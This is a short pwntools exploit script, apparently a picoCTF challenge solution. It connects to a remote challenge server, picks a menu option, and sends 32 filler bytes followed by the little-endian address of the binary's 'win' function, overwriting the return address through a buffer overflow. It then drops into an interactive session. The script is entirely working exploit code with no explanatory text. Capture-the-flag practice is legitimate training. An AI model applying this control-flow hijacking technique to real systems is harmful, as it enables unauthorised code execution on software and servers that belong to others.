from pwn import *
elf = ELF("chall")
conn = remote("mimas.picoctf.net",55794)
conn.sendline("2")
addr = elf.symbols["win"]
send = "a" * 32
hexStr = hex(addr)[2:]
hexStr = hexStr.zfill(8)
print(hexStr)
for i in range(len(hexStr) - 2, 0, -2):
    send += chr(int(hexStr[i:i+2], 16))
conn.sendline(send)
conn.interactive()
